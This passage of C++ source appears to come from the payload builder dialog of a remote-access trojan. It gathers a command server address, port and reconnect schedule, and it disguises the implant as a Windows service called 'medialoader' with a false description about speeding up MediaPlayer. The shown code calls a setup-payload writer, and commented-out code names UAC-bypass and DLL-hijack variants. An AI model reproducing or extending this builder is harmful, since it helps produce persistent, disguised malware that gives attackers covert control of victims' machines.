// 	generateConfig.serviceDisplayName = CString(Service_Info.szDisplayName);
	lstrcpyA(Service_Info.szDisplayName,CStringA(config.serviceDisplayName).GetBuffer());

// 	//得到服务描述
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICEDEC,Service_Info.szServiceDecript,sizeof(Service_Info.szServiceDecript));
// 	generateConfig.serviceDescription = CString(Service_Info.szServiceDecript);
	lstrcpyA(Service_Info.szServiceDecript,CStringA(config.serviceDescription).GetBuffer());

// 	//得到代理地址
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYADDR,Config_Info.szProxyAddr,sizeof(Config_Info.szProxyAddr));

// 	//得到代理用户名
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYUSER,Config_Info.szProxyUsername,sizeof(Config_Info.szProxyUsername));

// 	//得到代理用户密码
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYPASS,Config_Info.szProxyPassword,sizeof(Config_Info.szProxyPassword));

	//得到组名
	GetDlgItemTextA(m_hWnd,IDC_EDIT_GROUP,Config_Info.szGroups,sizeof(Config_Info.szProxyPassword));


	//得到通信方式
	int nSel = m_DefaultComm.GetCurSel();
	Config_Info.nDefaultCommType = m_DefaultComm.GetItemData(nSel);
	generateConfig.commType = m_DefaultComm.GetCurSel();

	//得到尝试连接间隔
	Config_Info.nTryConnectIntervalM = GetDlgItemInt(IDC_EDIT_TRY_INTERVALM);
	generateConfig.connectTryIntervalM = Config_Info.nTryConnectIntervalM;

	//得到首次连接时间
	Config_Info.nFirstConnectHour = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_HOUR);
	generateConfig.firstConnectHour = Config_Info.nFirstConnectHour;
	Config_Info.nFirstConnectMinute = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_MINUTE);
	generateConfig.firstConnectMinute = Config_Info.nFirstConnectMinute;

// 	//得到下载SVT时间和间隔
// 	Config_Info.nFirstDownSvtOffsetS = GetDlgItemInt(IDC_EDIT_FIRST_SVT_OFFSET);
// 	generateConfig.downSvtOffsetS = Config_Info.nFirstDownSvtOffsetS;
// 	Config_Info.nDownSvtIntervalS = GetDlgItemInt(IDC_EDIT_SVT_INTERVAL);
// 	generateConfig.downSvtIntervalS = Config_Info.nDownSvtIntervalS;

	//得到连接类型和代理方式
	Config_Info.nConnectType = m_ConnectType.GetCurSel();
//	Config_Info.nProxyType = m_ProxyType.GetCurSel();
	
	//得到是否随机安装和生成方式
//	Service_Info.bUseChameleon = (m_SetupType.GetCurSel() == 0);
//	generateConfig.setupType = m_SetupType.GetCurSel();

	Config_Info.nProxyPort = GetDlgItemInt(IDC_EDIT_PROXYPORT);

	//得到端口
	Config_Info.nPort = GetDlgItemInt(IDC_EDIT_PORT);
	generateConfig.port = GetDlgItemInt(IDC_EDIT_PORT);

// 	BOOL bCarrier = ((CButton*)GetDlgItem(IDC_RADIO_CARRIER))->GetCheck();
// 	BOOL bSetup = ((CButton*)GetDlgItem(IDC_RADIO_SETUP))->GetCheck();
// 	BOOL bPassUAC = ((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->GetCheck();
// 	BOOL bHijack = ((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->GetCheck();
	generateConfig.packetType = PACKET_TYPE_SETUP;
// 	if (bPassUAC) generateConfig.packetType = PACKET_TYPE_PASSUAC;
// 	if (bHijack) generateConfig.packetType = PACKET_TYPE_HIJACK;

	Config_Info.nFlag = CONNECT_FLAG;
	Service_Info.nFlag = SERVICE_FLAG;

	CString strError;
// 	if (bCarrier && WriteCarrier(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Carrier生成成功！"));
// 	}
// 	else if (bSetup && WriteSetup(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Setup生成成功！"));
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
// 	else if (bPassUAC && WriteBypassUAC(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(L"BypassUAC生成成功！");
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
// 	else if(bHijack && WriteHijack(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Hijack生成成功！"));
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%shijack\\RsTray.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
	if ( WriteSetup(Config_Info,Service_Info,strError))
	{
			MessageBox(_T("Setup生成成功！"));
			// 		CString exploreParameter;
			// 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
			// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
	}
	else 
	{
		MessageBox(strError);
	}
	
	SaveGeneratorConfig(generateConfig);
}


void CGeneratorDlg::OnBnClickedButtonClose()
{
	ExitProcess(0);
	// TODO: 在此添加控件通知处理程序代码
}


void CGeneratorDlg::OnBnClickedRadioPassuac()
{
	((CButton*)GetDlgItem(IDC_RADIO_SETUP))->SetCheck(FALSE);
	((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->SetCheck(FALSE);
	
// 	m_SetupType.SetCurSel(SETUP_TYPE_SPECIFIED);
// 	m_SetupType.EnableWindow(FALSE);

//	GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(FALSE);
}

void CGeneratorDlg::OnBnClickedRadioHijack()
{
	((CButton*)GetDlgItem(IDC_RADIO_SETUP))->SetCheck(FALSE);
	((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->SetCheck(FALSE);
	GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(FALSE);
	m_SetupType.SetCurSel(SETUP_TYPE_CHAMELEON);
	m_SetupType.EnableWindow(FALSE);
	OnCbnSelchangeComboSetupType();
}
void CGeneratorDlg::OnBnClickedRadioSetup()
{
	((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->SetCheck(FALSE);
	((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->SetCheck(FALSE);
// 	GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(TRUE);
// 	m_SetupType.EnableWindow(TRUE);
// 	GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(TRUE);
}

//安装方式选择框被改变时触发
void CGeneratorDlg::OnCbnSelchangeComboSetupType()
{
	if (m_SetupType.GetCurSel() == 0)
	{
		SetDlgItemText(IDC_EDIT_INSTALLPATH, _T("C:\\Program Files\\"));
	}
}

static LPCTSTR CONFIG_APP_NAME = _T("config");
static LPCTSTR SERVER_IP = _T("server_ip");
static LPCTSTR SERVICE_NAME = _T("service_name");
static LPCTSTR SERVICE_DISPLAY = _T("service_display");
static LPCTSTR SERVICE_DESCRIPTION = _T("service_description");
static LPCTSTR INSTALL_PATH = _T("install_path");
static LPCTSTR COMM_TYPE = _T("comm_type");
static LPCTSTR SETUP_TYPE = _T("setup_type");
static LPCTSTR CONNECT_TRY_INTERVAL_M = _T("connect_try_intervalm");
static LPCTSTR FIRST_CONNECT_HOUR = _T("first_connect_hour");
static LPCTSTR FIRST_CONNECT_MINUTE = _T("first_connect_minute");
static LPCTSTR DOWN_SVT_OFFSETS = _T("down_svt_offsets");
static LPCTSTR DOWN_SVT_INTERVALS = _T("down_svt_intervals");
static LPCTSTR PACKET_TYPE = _T("packet_type");
static LPCTSTR HTTP_PORT = _T("http_port");

void CGeneratorDlg::SaveGeneratorConfig( const GENERATOR_CONFIG& config )
{
#define WRITE_STRING_CONFIG(_configName, _val)			\
	::WritePrivateProfileString(CONFIG_APP_NAME, (_configName), (_val), iniFilepath);
#define WRITE_INT_CONFIG(_configName, _val)		\
	CString _temp##_configName;					\
	_temp##_configName.Format(_T("%d"), _val);	\
	::WritePrivateProfileString(CONFIG_APP_NAME, (_configName), _temp##_configName, iniFilepath);

	CString iniFilepath;
	iniFilepath.Format(_T("%sgenerator.ini"), GetModFilePath(NULL));

	WRITE_STRING_CONFIG(SERVER_IP, config.serverIP);
	WRITE_STRING_CONFIG(SERVICE_NAME, config.serviceName);
	WRITE_STRING_CONFIG(SERVICE_DISPLAY, config.serviceDisplayName);
	WRITE_STRING_CONFIG(SERVICE_DESCRIPTION, config.serviceDescription);
	WRITE_STRING_CONFIG(INSTALL_PATH, config.serviceInstallpath);
	WRITE_INT_CONFIG(SETUP_TYPE, config.setupType);
	WRITE_INT_CONFIG(CONNECT_TRY_INTERVAL_M, config.connectTryIntervalM);
	WRITE_INT_CONFIG(FIRST_CONNECT_HOUR, config.firstConnectHour);
	WRITE_INT_CONFIG(FIRST_CONNECT_MINUTE, config.firstConnectMinute);
	WRITE_INT_CONFIG(DOWN_SVT_OFFSETS, config.downSvtOffsetS);
	WRITE_INT_CONFIG(DOWN_SVT_INTERVALS, config.downSvtIntervalS);
	WRITE_INT_CONFIG(PACKET_TYPE, config.packetType);
	WRITE_INT_CONFIG(HTTP_PORT, config.port);
	WRITE_INT_CONFIG(COMM_TYPE, config.commType);
}

void CGeneratorDlg::LoadGeneratorConfig( GENERATOR_CONFIG& config )
{
#define READ_STRING_CONFIG(_configName, _defaultValue, _targetVar)			\
	ZeroMemory(buffer, sizeof(buffer));	\
	::GetPrivateProfileString(CONFIG_APP_NAME, (_configName), (_defaultValue), buffer, sizeof(buffer) / sizeof(TCHAR), iniFilepath);	\
	_targetVar = buffer;
#define READ_INT_CONFIG(_configName, _defaultValue, _targetVar)			\
	ZeroMemory(buffer, sizeof(buffer));	\
	::GetPrivateProfileString(CONFIG_APP_NAME, (_configName), (_defaultValue), buffer, sizeof(buffer) / sizeof(TCHAR), iniFilepath);	\
	_targetVar = _wtoi(buffer);

	CString iniFilepath;
	iniFilepath.Format(_T("%sgenerator.ini"), GetModFilePath(NULL));

	TCHAR buffer[MAX_PATH] = {0};
	READ_STRING_CONFIG(SERVER_IP, _T("127.0.0.1"), config.serverIP);
	//READ_STRING_CONFIG(SERVICE_NAME, _T("medialoader"), config.serviceName);
	config.serviceName = _T("medialoader");
	config.serviceDisplayName = _T("Medialoader Service");
	//READ_STRING_CONFIG(SERVICE_DESCRIPTION, _T("Make MediaPlayer loading media file faster"), config.serviceDescription);
	config.serviceDescription = _T("Make MediaPlayer loading media file faster");
	config.serviceInstallpath = _T("%ALLUSERSPROFILE%\\Medialoader");
	//	READ_STRING_CONFIG(INSTALL_PATH, _T("$%ALLUSERSPROFILE%"), config.serviceInstallpath);
	READ_INT_CONFIG(SETUP_TYPE, _T("1"), config.setupType);
	//READ_INT_CONFIG(CONNECT_TRY_INTERVAL_M, _T("30"), config.connectTryIntervalM);
	config.connectTryIntervalM = 30;
	READ_INT_CONFIG(FIRST_CONNECT_HOUR, _T("-1"), config.firstConnectHour);
	READ_INT_CONFIG(FIRST_CONNECT_MINUTE, _T("-1"), config.firstConnectMinute);
	READ_INT_CONFIG(DOWN_SVT_OFFSETS, _T("30"), config.downSvtOffsetS);
	READ_INT_CONFIG(DOWN_SVT_INTERVALS, _T("1800"), config.downSvtIntervalS);
	READ_INT_CONFIG(PACKET_TYPE, _T("0"), config.packetType);
	READ_INT_CONFIG(HTTP_PORT, _T("8081"), config.port);
	READ_INT_CONFIG(COMM_TYPE, _T("0"), config.commType);
}


void CGeneratorDlg::OnCbnSelendokComboComm()
{
// 	int nSel = m_DefaultComm.GetCurSel();
// 
// 	if (nSel == 1)
// 	{
// 		((CWnd*)GetDlgItem(IDC_EDIT_HTTPPORT))->EnableWindow(TRUE);
// 	}
// 	else if(nSel == 2)
// 	{
// 		((CWnd*)GetDlgItem(IDC_EDIT_HTTPPORT))->EnableWindow(TRUE);
// 	}
// 	else
// 	{
// 		((CWnd*)GetDlgItem(IDC_EDIT_HTTPPORT))->EnableWindow(FALSE);
// 	}
	return ;
	// TODO: 在此添加控件通知处理程序代码
}
